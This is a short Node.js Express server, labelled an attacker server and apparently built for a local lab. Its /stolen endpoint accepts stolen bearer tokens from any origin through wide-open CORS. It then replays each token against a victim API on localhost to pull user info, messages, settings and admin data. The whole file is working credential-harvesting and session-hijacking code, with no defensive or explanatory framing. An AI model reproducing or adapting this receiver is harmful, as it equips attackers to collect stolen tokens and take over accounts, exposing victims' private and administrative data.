const express = require('express');
const axios = require('axios');
const app = express();
const PORT = 9000;

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());

// 🛡️ Handle stolen data
app.post('/stolen', async (req, res) => {
  const { token, source } = req.body;
  console.log(`🕵️ Received token from ${source}:`, token);

  if (!token) {
    console.log('⚠️ No token received');
    return res.sendStatus(400);
  }

  const headers = {
    Authorization: `Bearer ${token}`
  };

  try {
    // Step 1: Get user info
    const userRes = await axios.get('http://localhost:4000/api/user', { headers });
    console.log(`👤 User Info:`, userRes.data);
  } catch (err) {
    console.log(`❌ Failed to get /api/user:`, err.response?.status, err.response?.data || err.message);
  }
// trying common endpoints
  const endpoints = ['/api/messages', '/api/settings', '/api/admin'];
  for (const path of endpoints) {
    try {
      const res = await axios.get(`http://localhost:4000${path}`, { headers });
      console.log(`📥 Data from ${path}:`, res.data);
    } catch (err) {
      console.log(`❌ Error calling ${path}:`, err.response?.status, err.response?.data || err.message);
    }
  }

  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`💀 Attacker server listening on http://localhost:${PORT}`);
});
